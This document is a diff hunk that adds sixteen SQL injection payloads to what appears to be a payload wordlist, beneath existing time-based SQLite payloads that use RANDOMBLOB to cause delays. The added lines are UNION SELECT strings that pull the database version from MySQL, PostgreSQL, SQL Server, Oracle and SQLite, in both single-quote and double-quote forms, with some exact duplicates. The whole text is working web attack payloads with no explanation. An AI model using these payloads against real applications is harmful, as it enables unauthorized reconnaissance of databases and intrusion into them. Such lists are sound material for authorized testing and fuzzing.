@@ -41,3 +41,19 @@ OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(5000000000/2))))
 RANDOMBLOB(10000000000/2)
 AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000000/2))))
 OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000000/2))))
+' UNION SELECT @@version --
+' UNION SELECT version() --
+' UNION SELECT @@version --
+' UNION SELECT SERVERPROPERTY('ProductVersion') --
+' UNION SELECT banner FROM v$version --
+' UNION SELECT version FROM v$instance --
+' UNION SELECT version() --
+' UNION SELECT sqlite_version() --
+" UNION SELECT @@version --
+" UNION SELECT version() --
+" UNION SELECT @@version --
+" UNION SELECT SERVERPROPERTY('ProductVersion') --
+" UNION SELECT banner FROM v$version --
+" UNION SELECT version FROM v$instance --
+" UNION SELECT version() --
+" UNION SELECT sqlite_version() --
